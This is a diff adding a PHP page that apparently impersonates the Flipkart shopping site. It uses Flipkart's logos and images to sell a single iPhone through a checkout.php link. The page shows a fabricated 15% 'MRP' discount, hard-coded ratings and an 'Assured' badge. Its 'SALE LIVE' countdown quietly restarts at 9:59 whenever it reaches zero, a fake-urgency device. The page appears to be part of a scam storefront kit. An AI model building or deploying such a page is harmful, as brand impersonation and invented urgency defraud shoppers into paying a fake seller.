@@ -1,0 +1,578 @@
+<?php
+require_once __DIR__ . '/config.php';
+$formattedPrice = number_format($iphonePrice);
+$mrpPrice = number_format(round($iphonePrice * 1.15));
+$discountPercent = round((($iphonePrice * 1.15 - $iphonePrice) / ($iphonePrice * 1.15)) * 100);
+?>
+<!DOCTYPE html>
+<html lang="en-IN">
+  <head>
+    <!-- Cache Prevention -->
+    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate" />
+    <meta http-equiv="Pragma" content="no-cache" />
+    <meta http-equiv="Expires" content="0" />
+
+    <!-- Google tag (gtag.js) -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-883V3BWLVE"></script>
+    <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag() { dataLayer.push(arguments); }
+      gtag("js", new Date());
+      gtag("config", "G-883V3BWLVE");
+    </script>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width,minimum-scale=1,user-scalable=no" />
+    <link rel="icon" href="https://static-assets-web.flixcart.com/batman-returns/batman-returns/p/images/logo_lite-cbb357.png" />
+    <link rel="apple-touch-icon" href="https://static-assets-web.flixcart.com/batman-returns/batman-returns/p/images/logo_lite-cbb357.png" />
+    <title>Flipkart big sale is live</title>
+
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet" />
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css" />
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" />
+
+    <style>
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+      }
+      body {
+        font-family: Inter, system-ui, -apple-system, "Segoe UI", Roboto, Arial, sans-serif;
+        background: #f1f3f6;
+        color: #212121;
+      }
+
+      .list {
+        display: grid;
+        grid-template-columns: repeat(2, minmax(0, 1fr));
+        gap: 8px;
+        padding: 8px;
+        max-width: 520px;
+        width: 100%;
+        margin: 0 auto;
+        box-sizing: border-box;
+        min-height: 100px;
+      }
+
+      .item {
+        background: #fff;
+        border-radius: 6px;
+        padding: 10px;
+        display: flex;
+        flex-direction: column;
+        text-decoration: none;
+        color: inherit;
+        box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
+        position: relative;
+        min-width: 0;
+        max-width: 100%;
+        width: 100%;
+        overflow: hidden;
+        box-sizing: border-box;
+        cursor: pointer;
+        transition: box-shadow 0.15s;
+      }
+      .item:active {
+        box-shadow: 0 2px 8px rgba(0, 0, 0, 0.15);
+      }
+
+      .img-wrap {
+        width: 100%;
+        height: 160px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        margin-bottom: 10px;
+        overflow: hidden;
+      }
+      .img-wrap img {
+        max-width: 100%;
+        max-height: 100%;
+        width: auto;
+        height: auto;
+        object-fit: contain;
+      }
+
+      .details {
+        display: flex;
+        flex-direction: column;
+        flex: 1;
+        min-width: 0;
+        width: 100%;
+      }
+
+      .title {
+        font-size: 13px;
+        font-weight: 500;
+        color: #212121;
+        line-height: 1.4;
+        display: -webkit-box;
+        -webkit-line-clamp: 2;
+        -webkit-box-orient: vertical;
+        overflow: hidden;
+        margin-bottom: 6px;
+        word-break: break-word;
+        overflow-wrap: anywhere;
+      }
+
+      .rating-row {
+        display: flex;
+        align-items: center;
+        flex-wrap: wrap;
+        gap: 4px;
+        margin-bottom: 6px;
+        min-width: 0;
+        max-width: 100%;
+      }
+      .stars {
+        color: #26a541;
+        font-size: 11px;
+        display: flex;
+        gap: 1px;
+        flex-shrink: 0;
+      }
+      .count {
+        font-size: 11px;
+        color: #878787;
+      }
+      .assured {
+        height: 14px;
+        margin-left: 2px;
+        max-width: 55px;
+        object-fit: contain;
+      }
+
+      .price-row {
+        display: flex;
+        align-items: center;
+        flex-wrap: wrap;
+        gap: 6px;
+        margin-bottom: 4px;
+        min-width: 0;
+      }
+      .disc {
+        font-size: 14px;
+        font-weight: 700;
+        color: #388e3c;
+      }
+      .mrp {
+        font-size: 12px;
+        font-weight: 500;
+        color: #878787;
+        text-decoration: line-through;
+      }
+      .sell {
+        font-size: 16px;
+        font-weight: 700;
+        color: #212121;
+      }
+
+      .wow {
+        display: flex;
+        align-items: center;
+        gap: 5px;
+        margin-bottom: 6px;
+        min-width: 0;
+        flex-wrap: wrap;
+      }
+      .wow img {
+        height: 15px;
+        flex-shrink: 0;
+      }
+      .wow-price {
+        font-size: 14px;
+        font-weight: 700;
+        color: #1a4fb8;
+      }
+      .wow-text {
+        font-size: 12px;
+        color: #1a4fb8;
+      }
+
+      .stock-text {
+        font-size: 12px;
+        font-weight: 600;
+        margin-bottom: 4px;
+      }
+
+      .delivery {
+        font-size: 12px;
+        color: #212121;
+        margin-top: auto;
+        word-break: break-word;
+      }
+      .delivery b {
+        font-weight: 600;
+      }
+
+      .categories-container {
+        padding: 5px 5px 2px;
+        background-color: #ffffff;
+        max-width: 520px;
+        margin: 0 auto;
+      }
+      .categories-grid {
+        display: grid;
+        grid-template-columns: repeat(5, 1fr);
+        gap: 4px;
+        margin-top: 6px;
+      }
+      .category-item a {
+        text-decoration: none;
+        color: #333333;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+      }
+      .category-item img {
+        width: 42px;
+        height: 42px;
+        margin-bottom: 6px;
+        object-fit: contain;
+      }
+      .category-label {
+        font-size: 12px;
+        font-weight: 500;
+        text-align: center;
+        line-height: 1.2;
+      }
+
+      .top-image-full {
+        max-width: 520px;
+        margin: 0 auto;
+        padding: 0;
+        line-height: 0;
+        background-color: #fff;
+      }
+      .top-image-full img {
+        width: 100%;
+        height: auto;
+        display: block;
+      }
+
+      .banner-image-full {
+        max-width: 520px;
+        margin: 0 auto;
+        padding: 6px 8px 0;
+        background-color: #fff;
+      }
+      .banner-image-full img {
+        width: 100%;
+        height: auto;
+        border-radius: 16px;
+        display: block;
+        box-shadow: 0 4px 12px rgba(0, 0, 0, 0.06);
+      }
+
+      .deal-bar {
+        max-width: 520px;
+        margin: 4px auto 0px;
+        padding: 9px 14px;
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        gap: 12px;
+        background: #fff;
+        border-bottom: 1px solid #f1f3f6;
+        font-size: 13px;
+      }
+      .deal-left {
+        display: flex;
+        align-items: center;
+        gap: 8px;
+        white-space: nowrap;
+      }
+      .deal-dot {
+        width: 7px;
+        height: 7px;
+        border-radius: 50%;
+        background: #00c853;
+        box-shadow: 0 0 0 rgba(0, 200, 83, 0.6);
+        animation: dealPulse 1.4s infinite;
+      }
+      @keyframes dealPulse {
+        0% {
+          box-shadow: 0 0 0 0 rgba(0, 200, 83, 0.6);
+        }
+        70% {
+          box-shadow: 0 0 0 8px rgba(0, 200, 83, 0);
+        }
+        100% {
+          box-shadow: 0 0 0 0 rgba(0, 200, 83, 0);
+        }
+      }
+      .deal-title {
+        font-weight: 700;
+        color: #1f3fb8;
+      }
+      .deal-sep {
+        color: #9aa3b2;
+      }
+      .deal-timer {
+        color: #5f6368;
+      }
+      .deal-timer b {
+        font-weight: 800;
+        color: #e65100;
+      }
+      .deal-btn {
+        flex-shrink: 0;
+        text-decoration: none;
+        font-weight: 700;
+        font-size: 12px;
+        color: #ffffff;
+        padding: 6px 12px;
+        border-radius: 10px;
+        background: linear-gradient(135deg, #2874f0, #1f4bd8);
+        box-shadow: 0 6px 14px rgba(40, 116, 240, 0.35);
+      }
+      .deal-btn:active {
+        transform: scale(0.97);
+      }
+
+      .premium-loader {
+        display: none;
+        padding: 16px 0 20px;
+        text-align: center;
+      }
+      .premium-loader .dots {
+        display: inline-flex;
+        gap: 6px;
+      }
+      .premium-loader .dots span {
+        width: 7px;
+        height: 7px;
+        border-radius: 50%;
+        background: #2874f0;
+        opacity: 0.25;
+        animation: dotPulse 1.4s infinite ease-in-out;
+      }
+      .premium-loader .dots span:nth-child(1) {
+        animation-delay: 0s;
+      }
+      .premium-loader .dots span:nth-child(2) {
+        animation-delay: 0.15s;
+      }
+      .premium-loader .dots span:nth-child(3) {
+        animation-delay: 0.3s;
+      }
+
+      @keyframes dotPulse {
+        0%, 80%, 100% {
+          opacity: 0.25;
+          transform: scale(0.8);
+        }
+        40% {
+          opacity: 1;
+          transform: scale(1);
+        }
+      }
+
+      .page-end {
+        height: 20px;
+      }
+
+      body.fk-loading {
+        overflow: hidden;
+        background: #2874f0;
+      }
+      .fk-loader-screen {
+        position: fixed;
+        inset: 0;
+        z-index: 10001;
+        background: #2874f0;
+        display: flex;
+        flex-direction: column;
+        justify-content: center;
+        align-items: center;
+        font-family: Arial, sans-serif;
+        transition: opacity 0.25s ease-out;
+      }
+      .fk-loader-screen.is-hidden {
+        opacity: 0;
+        pointer-events: none;
+        visibility: hidden;
+      }
+      .loader-logo {
+        width: 60px;
+        height: auto;
+        animation: fkLoaderPulse 1.2s infinite;
+        object-fit: contain;
+      }
+      @keyframes fkLoaderPulse {
+        0%, 100% {
+          transform: scale(1);
+          opacity: 1;
+        }
+        50% {
+          transform: scale(1.1);
+          opacity: 0.8;
+        }
+      }
+      .fk-loader-screen .loader-text {
+        font-weight: bold;
+        color: #fff;
+        font-size: 15px;
+        margin-top: 15px;
+        letter-spacing: 0.5px;
+      }
+    </style>
+  </head>
+  <body class="fk-loading">
+    <div id="fkLoader" class="fk-loader-screen" aria-live="polite">
+      <img
+        src="https://static-assets-web.flixcart.com/batman-returns/batman-returns/p/images/logo_lite-cbb357.png"
+        class="loader-logo"
+        id="ldr"
+        alt="Loading"
+      />
+      <div class="loader-text" id="txt">Loading Flipkart...</div>
+      <noscript>Please enable JavaScript to view this application.</noscript>
+    </div>
+
+    <div id="mainApp">
+      <div style="background-color: #fff">
+        <div class="top-image-full">
+          <img
+            src="assets/top.jpg"
+            width="100%"
+            height="auto"
+            alt="Top Banner"
+            onerror="this.src='https://static-assets-web.flixcart.com/batman-returns/batman-returns/p/images/logo_lite-cbb357.png'"
+          />
+        </div>
+
+        <div class="banner-image-full">
+          <img
+            src="assets/banner.jpg"
+            width="100%"
+            height="auto"
+            alt="Freedom Sale"
+            onerror="this.src='https://rukminim2.flixcart.com/fk-p-flap/752/366/image/38b84f33a00481ae.png?q=60'"
+          />
+        </div>
+
+        <div class="categories-container">
+          <div class="categories-grid">
+            <div class="category-item">
+              <a href="#homeList">
+                <img src="https://rukminim2.flixcart.com/fk-p-flap/106/106/image/86a19de055a5ae2c.jpg" alt="Mobiles" />
+                <p class="category-label">Mobiles</p>
+              </a>
+            </div>
+            <div class="category-item">
+              <a href="#homeList">
+                <img src="https://rukminim2.flixcart.com/fk-p-flap/106/106/image/9af2825c1882cb09.jpg" alt="Electronics" />
+                <p class="category-label">Electronics</p>
+              </a>
+            </div>
+            <div class="category-item">
+              <a href="#homeList">
+                <img src="https://rukminim2.flixcart.com/fk-p-flap/106/106/image/cba3261ad6af85cf.png" alt="Appliances" />
+                <p class="category-label">Appliances</p>
+              </a>
+            </div>
+            <div class="category-item">
+              <a href="#homeList">
+                <img src="https://rukminim2.flixcart.com/fk-p-flap/106/106/image/15d49cf205683c05.jpg" alt="Furniture" />
+                <p class="category-label">Furniture</p>
+              </a>
+            </div>
+            <div class="category-item">
+              <a href="#homeList">
+                <img src="https://rukminim2.flixcart.com/fk-p-flap/106/106/image/987e8204a510854d.png" alt="Grocery" />
+                <p class="category-label">Grocery</p>
+              </a>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <div class="deal-bar" id="dealBar" data-minutes="10">
+        <div class="deal-left">
+          <span class="deal-dot"></span>
+          <span class="deal-title">SALE LIVE</span>
+          <span class="deal-sep">•</span>
+          <span class="deal-timer">
+            Ends in <b id="dbMin">09</b>:<b id="dbSec">59</b>
+          </span>
+        </div>
+        <a href="#homeList" class="deal-btn">Shop Now<i class="bi bi-chevron-right"></i></a>
+      </div>
+
+      <div class="list" id="homeList">
+        <a href="checkout.php" class="item" id="iphoneItem">
+          <div class="img-wrap">
+            <img src="https://rukminim2.flixcart.com/image/312/312/xif0q/mobile/h/d/9/-original-imagtc2fz9spysyk.jpeg?q=70" alt="iPhone" />
+          </div>
+          <div class="details">
+            <div class="title">iPhone (128 GB, Black)</div>
+            <div class="rating-row">
+              <span class="stars">
+                <span style="background:#26a541;color:#fff;font-size:10px;font-weight:600;padding:1px 5px;border-radius:3px;display:inline-flex;align-items:center;gap:2px;">
+                  4.7 <i class="bi bi-star-fill" style="font-size:8px;"></i>
+                </span>
+              </span>
+              <span class="count">(14,892)</span>
+              <img src="https://static-assets-web.flixcart.com/batman-returns/batman-returns/p/images/fkheaderlogo_plus-055f80.svg" class="assured" alt="Assured" onerror="this.style.display='none'" />
+            </div>
+            <div class="price-row">
+              <span class="sell">₹<?php echo $formattedPrice; ?></span>
+              <span class="mrp">₹<?php echo $mrpPrice; ?></span>
+              <span class="disc"><?php echo $discountPercent; ?>% off</span>
+            </div>
+            <div class="delivery">Free delivery by <b>Tomorrow</b></div>
+          </div>
+        </a>
+      </div>
+
+      <div id="scrollLoader" class="premium-loader" style="display: none">
+        <div class="dots"><span></span><span></span><span></span></div>
+      </div>
+
+      <div class="page-end"></div>
+    </div>
+
+    <script>
+      (function () {
+        var LOADER_MS = 100;
+        function hideLoader() {
+          var loader = document.getElementById("fkLoader");
+          if (loader) loader.classList.add("is-hidden");
+          document.body.classList.remove("fk-loading");
+          setTimeout(function () {
+            if (loader && loader.parentNode)
+              loader.parentNode.removeChild(loader);
+          }, 300);
+        }
+        setTimeout(hideLoader, LOADER_MS);
+
+        // Timer
+        var minutes = 9;
+        var seconds = 59;
+        var minElem = document.getElementById('dbMin');
+        var secElem = document.getElementById('dbSec');
+        if (minElem && secElem) {
+          setInterval(function() {
+            if (seconds === 0) {
+              if (minutes === 0) {
+                minutes = 9;
+                seconds = 59;
+              } else {
+                minutes--;
+                seconds = 59;
+              }
+            } else {
+              seconds--;
+            }
+            minElem.textContent = minutes < 10 ? '0' + minutes : minutes;
+            secElem.textContent = seconds < 10 ? '0' + seconds : seconds;
+          }, 1000);
+        }
+      })();
+    </script>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js" defer></script>
+  </body>
+</html>
